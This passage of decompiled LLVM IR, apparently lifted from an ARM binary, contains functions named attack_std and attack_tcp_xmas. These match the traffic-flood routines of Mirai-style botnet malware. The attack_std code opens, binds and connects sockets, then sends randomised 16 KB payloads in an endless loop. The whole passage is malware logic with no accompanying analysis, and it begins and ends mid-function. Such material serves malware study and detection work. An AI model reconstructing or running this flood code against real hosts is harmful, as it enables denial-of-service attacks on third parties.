  %v9_95a4 = icmp eq i32 %v0_95a4, 65535
  store i1 %v9_95a4, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = load i32, i32* @r5, align 4
  %v2_95a8 = add i32 %v1_95a8, 12
  %v3_95a8 = inttoptr i32 %v2_95a8 to i32*
  store i32 %v0_9598, i32* %v3_95a8, align 4
  br i1 %v9_95a4, label %dec_label_pc_95b0, label %dec_label_pc_9598.dec_label_pc_9454_crit_edge

dec_label_pc_9598.dec_label_pc_9454_crit_edge:    ; preds = %dec_label_pc_9598
  %v1_9458.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9454

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9444
  %v0_95b0 = call i32 @rand_next()
  %v3_95b8 = urem i32 %v0_95b0, 65536
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v1_95c4 = sub nsw i32 999, %v3_95b8
  store i32 %v1_95c4, i32* %r3.global-to-local, align 4
  %v1_95c8 = load i32, i32* %r4.global-to-local, align 4
  %v9_95c8 = icmp eq i32 %v3_91dc, %v1_95c8
  store i1 %v9_95c8, i1* %cpsr_z.global-to-local, align 1
  %v1_95cc = trunc i32 %v0_95b0 to i16
  %v2_95cc = load i32, i32* @r5, align 4
  %v3_95cc = add i32 %v2_95cc, 4
  %v4_95cc = inttoptr i32 %v3_95cc to i16*
  store i16 %v1_95cc, i16* %v4_95cc, align 2
  %v0_95d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i16
  %v2_95d0 = load i32, i32* @r6, align 4
  %v3_95d0 = add i32 %v2_95d0, 4
  %v4_95d0 = inttoptr i32 %v3_95d0 to i16*
  store i16 %v1_95d0, i16* %v4_95d0, align 2
  br i1 %v9_95c8, label %dec_label_pc_95d8, label %dec_label_pc_95b0.dec_label_pc_9460_crit_edge

dec_label_pc_95b0.dec_label_pc_9460_crit_edge:    ; preds = %dec_label_pc_95b0
  %v1_9464.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9460

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95b0, %dec_label_pc_9454
  %v0_95d8 = call i32 @rand_next()
  %v1_95d8 = trunc i32 %v0_95d8 to i16
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v1_95e0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95e0 = icmp eq i32 %v3_91e0, %v1_95e0
  store i1 %v9_95e0, i1* %cpsr_z.global-to-local, align 1
  %v3_95e4 = load i32, i32* @r5, align 4
  %v4_95e4 = add i32 %v3_95e4, 44
  %v5_95e4 = inttoptr i32 %v4_95e4 to i16*
  store i16 %v1_95d8, i16* %v5_95e4, align 2
  br i1 %v9_95e0, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  %v0_95ec = call i32 @rand_next()
  %v1_95ec = trunc i32 %v0_95ec to i16
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_95ec
  %v3_95fc31 = load i32, i32* @r7, align 4
  %v4_95fc32 = add i32 %v3_95fc31, 2
  %v5_95fc33 = inttoptr i32 %v4_95fc32 to i16*
  store i16 %v1_95ec, i16* %v5_95fc33, align 2
  br label %dec_label_pc_9608

bb85:                                             ; preds = %dec_label_pc_95ec
  %v1_95f8 = load i32, i32* @r5, align 4
  %v2_95f8 = add i32 %v1_95f8, 16
  %v3_95f8 = inttoptr i32 %v2_95f8 to i32*
  %v4_95f8 = load i32, i32* %v3_95f8, align 4
  store i32 %v4_95f8, i32* %r3.global-to-local, align 4
  %v3_95fc = load i32, i32* @r7, align 4
  %v4_95fc = add i32 %v3_95fc, 2
  %v5_95fc = inttoptr i32 %v4_95fc to i16*
  store i16 %v1_95ec, i16* %v5_95fc, align 2
  %v1_9600 = load i32, i32* %r3.global-to-local, align 4
  %v2_9600 = load i32, i32* @r6, align 4
  %v3_9600 = add i32 %v2_9600, 16
  %v4_9600 = inttoptr i32 %v3_9600 to i32*
  store i32 %v1_9600, i32* %v4_9600, align 4
  br label %dec_label_pc_9480

dec_label_pc_9608:                                ; preds = %.thread30, %dec_label_pc_946c
  %v0_9608 = call i32 @rand_next()
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  %v1_9614 = load i32, i32* @r6, align 4
  %v2_9614 = add i32 %v1_9614, 16
  %v3_9614 = inttoptr i32 %v2_9614 to i32*
  store i32 %v0_9608, i32* %v3_9614, align 4
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_961c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608
  %v0_961c = load i32, i32* @r7, align 4
  %v1_961c = add i32 %v0_961c, 8
  store i32 %v6_9128, i32* %r1.global-to-local, align 4
  %v2_9624 = inttoptr i32 %v1_961c to i16*
  %v3_9624 = call i32 @rand_str(i16* %v2_9624, i32 %v6_9128)
  br label %dec_label_pc_948c

dec_label_pc_962c:                                ; preds = %dec_label_pc_91a0
  %v1_9630 = call i32 @__GI___libc_close(i32 %v3_9190)
  br label %dec_label_pc_9634

dec_label_pc_9634:                                ; preds = %entry, %dec_label_pc_962c
  %v1_963c = phi i32 [ %v3_9190, %entry ], [ %v1_9630, %dec_label_pc_962c ]
  store i32 %v3_9040, i32* %r4.global-to-local, align 4
  store i32 %v6_9040, i32* %r5.global-to-local, align 4
  store i32 %v24_9040, i32* %fp.global-to-local, align 4
  ret i32 %v1_963c

dec_label_pc_9640:                                ; preds = %dec_label_pc_91c8
  store i32 %v6_9128, i32* %r2.global-to-local, align 4
  %v1_9648 = add i32 %v6_9128, 8
  store i32 %v1_9648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93fc.preheader

; uselistorder directives
  uselistorder i32 %v1_9648, { 1, 0 }
  uselistorder i16 %v1_95ec, { 1, 0 }
  uselistorder i32 %v0_95b0, { 1, 0 }
  uselistorder i32 %v5_9588, { 1, 0 }
  uselistorder i32 %v0_954c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9528, { 1, 2, 0 }
  uselistorder i32 %v1_9524, { 2, 0, 3, 1 }
  uselistorder i32 %v3_94d8, { 1, 0, 2 }
  uselistorder i32 %v0_94c0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9424, { 1, 0, 2 }
  uselistorder i1 %v7_943c, { 2, 1, 0 }
  uselistorder i1 %v2_9610, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95f4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9398, { 1, 0 }
  uselistorder i32 %v4_930c13, { 1, 0 }
  uselistorder i32 %v3_9230, { 1, 0 }
  uselistorder i32 %v3_9214, { 1, 2, 0 }
  uselistorder i32 %v1_9210, { 1, 0 }
  uselistorder i32 %v1_91d4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_91d0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_91cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_91c8, { 1, 0, 2, 3 }
  uselistorder i1 %v7_91c0, { 1, 0 }
  uselistorder i1 %v7_9194, { 1, 0 }
  uselistorder i32 %v3_9190, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_917c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9148, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9128, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_90dc, { 1, 2, 0 }
  uselistorder i32 %v1_90b8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_90b0, { 1, 0 }
  uselistorder i32 %v6_9074, { 2, 1, 3, 0 }
  uselistorder i32 %v2_905c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 6, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_961c, { 1, 0 }
  uselistorder label %dec_label_pc_948c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93fc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_965c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9678 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_9678, i32* @sl, align 4
  %v0_9684 = load i32, i32* @r7, align 4
  %v2_9688 = call i32 @calloc(i32 %v0_9684, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_9694 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_9688, i32* @r8, align 4
  %v0_96a4 = load i32, i32* @r5, align 4
  %v5_96a8 = inttoptr i32 %v0_9694 to i32*
  %v6_96a8 = call i32 @attack_get_opt_int(i32 %v0_96a4, i32* %v5_96a8, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_96b0 = urem i32 %v6_96a8, 65536
  %v0_96b4 = load i32, i32* @r6, align 4
  %v0_96bc = load i32, i32* @r4, align 4
  store i32 %v0_96bc, i32* %r3.global-to-local, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %v5_96c8 = inttoptr i32 %v0_96b4 to i32*
  %v6_96c8 = call i32 @attack_get_opt_int(i32 %v0_96c0, i32* %v5_96c8, i32 6, i32 %v0_96bc, i32 %v3_96b0)
  %v0_96cc = load i32, i32* @r6, align 4
  %v3_96d0 = mul i32 %v6_96c8, 65536
  store i32 %v3_96d0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v5_96e0 = inttoptr i32 %v0_96cc to i32*
  %v6_96e0 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r6, align 4
  %v0_96f4 = load i32, i32* @r5, align 4
  %v3_96f8 = urem i32 %v6_96e0, 65536
  store i32 %v3_96f8, i32* @r5, align 4
  %v5_96fc = inttoptr i32 %v0_96f0 to i32*
  %v6_96fc = call i32 @attack_get_opt_int(i32 %v0_96f4, i32* %v5_96fc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_9700 = load i32, i32* %sb.global-to-local, align 4
  %v3_9700 = udiv i32 %v0_9700, 65536
  store i32 %v3_9700, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9708 = load i32, i32* @r4, align 4
  %v9_9708 = icmp eq i32 %v3_9700, %v1_9708
  br i1 %v9_9708, label %dec_label_pc_9738, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_9720 = udiv i32 %v0_9700, 16777216
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9748

dec_label_pc_9738:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_9738 = call i32 @rand_next()
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %bb, %dec_label_pc_9738
  %v0_972c10 = urem i32 %v6_96fc, 256
  %v0_9748 = load i32, i32* @r7, align 4
  %v2_9748 = icmp eq i32 %v0_9748, 0
  br i1 %v2_9748, label %dec_label_pc_9888, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9748
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97fc = udiv i32 %v3_96b0, 256
  %v1_97f8 = mul i32 %v6_96a8, 256
  %v4_9800 = and i32 %v1_97f8, 65280
  %v5_9800 = or i32 %v4_9800, %v3_97fc
  %v2_9780 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97e0

dec_label_pc_9760:                                ; preds = %bb51, %dec_label_pc_9820
  %v3_976c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_9774 = icmp eq i32 %v3_976c, -1
  %v0_9778 = load i32, i32* @sb, align 4
  %v1_9778 = add i32 %v0_9778, 1
  store i32 %v1_9778, i32* @sb, align 4
  %v0_977c = load i32, i32* @fp, align 4
  %v1_977c = add i32 %v0_977c, 24
  store i32 %v1_977c, i32* @fp, align 4
  %v2_9788 = load i32, i32* @r8, align 4
  %v3_9788 = add i32 %v2_9788, %stack_var_-60.0
  %v4_9788 = inttoptr i32 %v3_9788 to i32*
  store i32 %v3_976c, i32* %v4_9788, align 4
  br i1 %v7_9774, label %dec_label_pc_987c, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_9760
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_97a8 = call i32 @bind(i32 %v3_976c, i32 %v2_9780, i32 16)
  %v0_97ac = load i32, i32* @r6, align 4
  %v1_97ac = add i32 %v0_97ac, 20
  %v2_97ac = inttoptr i32 %v1_97ac to i8*
  %v3_97ac = load i8, i8* %v2_97ac, align 1
  %v4_97ac = zext i8 %v3_97ac to i32
  store i32 %v4_97ac, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_97ac, 32
  br i1 %tmp, label %dec_label_pc_9834, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790, %dec_label_pc_9834
  %v0_97bc = phi i32 [ %v0_97ac, %dec_label_pc_9790 ], [ %v0_97bc.pre, %dec_label_pc_9834 ]
  %v1_97c0 = load i32, i32* @r8, align 4
  %v2_97c0 = add i32 %v1_97c0, %stack_var_-60.0
  %v3_97c0 = inttoptr i32 %v2_97c0 to i32*
  %v4_97c0 = load i32, i32* %v3_97c0, align 4
  %v3_97c8 = call i32 @__libc_connect(i32 %v4_97c0, i32 %v0_97bc, i32 16)
  %v0_97d0 = load i32, i32* @sb, align 4
  %v1_97d0 = load i32, i32* @r7, align 4
  %v9_97d0 = icmp eq i32 %v0_97d0, %v1_97d0
  %v1_97d4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  br i1 %v9_97d0, label %dec_label_pc_9888, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9750
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9750 ], [ %v1_97d4, %dec_label_pc_97b8 ]
  store i32 65535, i32* @r4, align 4
  %v2_97f0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_9800, i32* %r3.global-to-local, align 4
  %v1_980c = load i32, i32* @r4, align 4
  %v9_980c = icmp eq i32 %v3_96b0, %v1_980c
  %v1_9810 = load i32, i32* @fp, align 4
  %v2_9810 = add i32 %v1_9810, %arg2
  store i32 %v2_9810, i32* @r6, align 4
  %v2_9814 = load i32, i32* @sl, align 4
  %v3_9814 = add i32 %v2_9814, %stack_var_-60.0
  %v4_9814 = inttoptr i32 %v3_9814 to i32*
  store i32 %v2_97f0, i32* %v4_9814, align 4
  br i1 %v9_980c, label %dec_label_pc_9820, label %bb51

bb51:                                             ; preds = %dec_label_pc_97e0
  %v1_9818 = load i32, i32* %r3.global-to-local, align 4
  %v2_9818 = trunc i32 %v1_9818 to i16
  %v3_9818 = load i32, i32* @r6, align 4
  %v4_9818 = add i32 %v3_9818, 2
  %v5_9818 = inttoptr i32 %v4_9818 to i16*
  store i16 %v2_9818, i16* %v5_9818, align 2
  br label %dec_label_pc_9760

dec_label_pc_9820:                                ; preds = %dec_label_pc_97e0
  %v0_9820 = call i32 @rand_next()
  %v1_9820 = trunc i32 %v0_9820 to i16
  %v0_9828 = load i32, i32* @fp, align 4
  %v2_9828 = add i32 %v0_9828, %arg2
  store i32 %v2_9828, i32* @r6, align 4
  %v4_982c = add i32 %v2_9828, 2
  %v5_982c = inttoptr i32 %v4_982c to i16*
  store i16 %v1_9820, i16* %v5_982c, align 2
  br label %dec_label_pc_9760

dec_label_pc_9834:                                ; preds = %dec_label_pc_9790
  %v1_9834 = add i32 %v0_97ac, 16
  %v2_9834 = inttoptr i32 %v1_9834 to i32*
  %v3_9834 = load i32, i32* %v2_9834, align 4
  store i32 %v3_9834, i32* @r4, align 4
  %v0_9838 = call i32 @rand_next()
  %v0_983c = load i32, i32* @r4, align 4
  %v1_9848 = and i32 %v0_983c, 65280
  store i32 %v1_9848, i32* %r3.global-to-local, align 4
  %v0_9850 = load i32, i32* @r6, align 4
  %v1_9850 = add i32 %v0_9850, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  %v5_9854 = call i32 @llvm.bswap.i32(i32 %v0_983c)
  %v7_9858 = lshr i32 %v0_9838, %v4_9850
  %v8_9858 = add i32 %v7_9858, %v5_9854
  %v5_9870 = call i32 @llvm.bswap.i32(i32 %v8_9858)
  store i32 %v5_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = add i32 %v0_9850, 4
  %v3_9874 = inttoptr i32 %v2_9874 to i32*
  store i32 %v5_9870, i32* %v3_9874, align 4
  %v0_97bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_97b8

dec_label_pc_987c:                                ; preds = %dec_label_pc_9760
  store i32 %v18_965c, i32* %sb.global-to-local, align 4
  ret i32 %v3_976c

dec_label_pc_9888:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9748
  %v1_98c822 = phi i32 [ 0, %dec_label_pc_9748 ], [ %v0_97d0, %dec_label_pc_97b8 ]
  %v2_988c = icmp eq i32 %v0_972c10, 0
  br i1 %v2_988c, label %dec_label_pc_98ac.outer, label %dec_label_pc_98c4

dec_label_pc_989c:                                ; preds = %dec_label_pc_98ac
  store i32 %v1_98a0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_989c = load i32, i32* @r8, align 4
  %v4_989c = mul i32 %v1_98a0, 4
  %v5_989c = add i32 %v0_989c, %v4_989c
  %v6_989c = inttoptr i32 %v5_989c to i32*
  %v7_989c = load i32, i32* %v6_989c, align 4
  %v0_98a0 = load i32, i32* @sl, align 4
  %v5_98a0 = add i32 %v0_98a0, %v4_989c
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v4_98a4 = call i32 @__libc_send(i32 %v7_989c, i32 %v7_98a0, i32 %v0_98b0, i32 16384)
  %v0_98a8 = load i32, i32* @r4, align 4
  %v1_98a8 = add i32 %v0_98a8, 1
  %v0_98ac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98ac.outer

dec_label_pc_98ac.outer:                          ; preds = %dec_label_pc_9888, %dec_label_pc_989c
  %v0_98ac.ph = phi i32 [ %v0_98ac.pre.pre, %dec_label_pc_989c ], [ %v1_98c822, %dec_label_pc_9888 ]
  %v1_98a0.ph = phi i32 [ %v1_98a8, %dec_label_pc_989c ], [ 0, %dec_label_pc_9888 ]
  %v0_98b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_98ac

dec_label_pc_98ac:                                ; preds = %dec_label_pc_98ac.outer, %dec_label_pc_98ac
  %v1_98a0 = phi i32 [ 0, %dec_label_pc_98ac ], [ %v1_98a0.ph, %dec_label_pc_98ac.outer ]
  %v8_98b8 = icmp sgt i32 %v0_98ac.ph, %v1_98a0
  br i1 %v8_98b8, label %dec_label_pc_989c, label %dec_label_pc_98ac

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98c8, %dec_label_pc_9888
  %v1_98c821 = phi i32 [ %v1_98c822, %dec_label_pc_9888 ], [ %v1_98c8, %dec_label_pc_98c8 ]
  br label %dec_label_pc_98c8

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_98c4
  %v1_98c8 = phi i32 [ %v1_98c821, %dec_label_pc_98c4 ], [ %v1_98c8.pre, %dec_label_pc_98d4 ]
  %v1_98d4 = phi i32 [ 0, %dec_label_pc_98c4 ], [ %v1_98f4, %dec_label_pc_98d4 ]
  store i32 %v1_98d4, i32* @r6, align 4
  %v6_98d0 = icmp slt i32 %v1_98d4, %v1_98c8
  br i1 %v6_98d0, label %dec_label_pc_98d4, label %dec_label_pc_98c4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98c8
  %v0_98cc = load i32, i32* @r5, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  %v4_98d4 = mul i32 %v1_98d4, 4
  %v5_98d4 = add i32 %v0_98d4, %v4_98d4
  %v6_98d4 = inttoptr i32 %v5_98d4 to i32*
  %v7_98d4 = load i32, i32* %v6_98d4, align 4
  store i32 %v7_98d4, i32* @r4, align 4
  %v2_98dc = inttoptr i32 %v7_98d4 to i16*
  %v3_98dc = call i32 @rand_str(i16* %v2_98dc, i32 %v0_98cc)
  %v0_98e0 = load i32, i32* @r8, align 4
  %v1_98e0 = load i32, i32* @r6, align 4
  %v4_98e0 = mul i32 %v1_98e0, 4
  %v5_98e0 = add i32 %v4_98e0, %v0_98e0
  %v6_98e0 = inttoptr i32 %v5_98e0 to i32*
  %v7_98e0 = load i32, i32* %v6_98e0, align 4
  %v0_98e4 = load i32, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98f0 = call i32 @__libc_send(i32 %v7_98e0, i32 %v0_98e4, i32 %v0_98e8, i32 16384)
  %v0_98f4 = load i32, i32* @r6, align 4
  %v1_98f4 = add i32 %v0_98f4, 1
  %v1_98c8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98c8

; uselistorder directives
  uselistorder i32 %v1_98c8, { 1, 0 }
  uselistorder i32 %v1_98a0, { 2, 1, 0 }
  uselistorder i32 %v5_9870, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97ac, { 1, 0, 2 }
  uselistorder i32 %v3_976c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_9700, { 1, 0 }
  uselistorder i32 %v3_96b0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_98ac, { 1, 0 }
  uselistorder label %dec_label_pc_98ac.outer, { 1, 0 }
  uselistorder label %dec_label_pc_97b8, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
}

define i32 @attack_tcp_xmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98fc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_9918 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_9924 = load i32, i32* @r6, align 4
  store i32 %v0_9924, i32* %r0.global-to-local, align 4
  %v2_9928 = call i32 @calloc(i32 %v0_9924, i32 4)
  %v0_992c = load i32, i32* @r5, align 4
  store i32 %v0_992c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_993c = load i32, i32* @r4, align 4
  store i32 %v0_993c, i32* %r0.global-to-local, align 4
  %v5_9940 = inttoptr i32 %v0_992c to i32*
  %v6_9940 = call i32 @attack_get_opt_int(i32 %v0_993c, i32* %v5_9940, i32 2, i32 0, i32 %v2_9928)
  %v1_994c = urem i32 %v6_9940, 256
  store i32 %v1_994c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9958 = load i32, i32* @r5, align 4
  store i32 %v0_9958, i32* %r1.global-to-local, align 4
  %v0_995c = load i32, i32* @r4, align 4
  store i32 %v0_995c, i32* %r0.global-to-local, align 4
  %v5_9960 = trunc i32 %v6_9940 to i8
  %v6_9964 = inttoptr i32 %v0_9958 to i32*
  %v7_9964 = call i32 @attack_get_opt_int(i32 %v0_995c, i32* %v6_9964, i32 3, i32 65535, i32 %v6_9940)
  %v0_9968 = load i32, i32* @r5, align 4
  store i32 %v0_9968, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9964, i32* @r7, align 4
  %v0_9978 = load i32, i32* @r4, align 4
  store i32 %v0_9978, i32* %r0.global-to-local, align 4
  %v5_997c = inttoptr i32 %v0_9968 to i32*
  %v6_997c = call i32 @attack_get_opt_int(i32 %v0_9978, i32* %v5_997c, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_9984 = urem i32 %v6_997c, 256
  store i32 %v1_9984, i32* %ip.global-to-local, align 4
  %v0_9988 = load i32, i32* @r5, align 4
  store i32 %v0_9988, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9994 = load i32, i32* @r4, align 4
  store i32 %v0_9994, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_997c, 16777216
  %v5_999c = sdiv i32 %sext, 16777216
  %v6_999c = inttoptr i32 %v0_9988 to i32*
  %v7_999c = call i32 @attack_get_opt_int(i32 %v0_9994, i32* %v6_999c, i32 5, i32 1, i32 %v5_999c)
  %v1_99a8 = urem i32 %v7_999c, 256
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_99b0 = load i32, i32* @r5, align 4
  store i32 %v0_99b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_99b8 = load i32, i32* @r4, align 4
  store i32 %v0_99b8, i32* %r0.global-to-local, align 4
  %v5_99c0 = inttoptr i32 %v0_99b0 to i32*
  %v6_99c0 = call i32 @attack_get_opt_int(i32 %v0_99b8, i32* %v5_99c0, i32 7, i32 65535, i32 %v1_99a8)
  %v0_99c4 = load i32, i32* @r5, align 4
  store i32 %v0_99c4, i32* %r1.global-to-local, align 4
  %v3_99c8 = mul i32 %v6_99c0, 65536
  store i32 %v3_99c8, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r4, align 4
  store i32 %v0_99d4, i32* %r0.global-to-local, align 4
  %v3_99d8 = urem i32 %v6_99c0, 65536
  store i32 %v3_99d8, i32* @sl, align 4
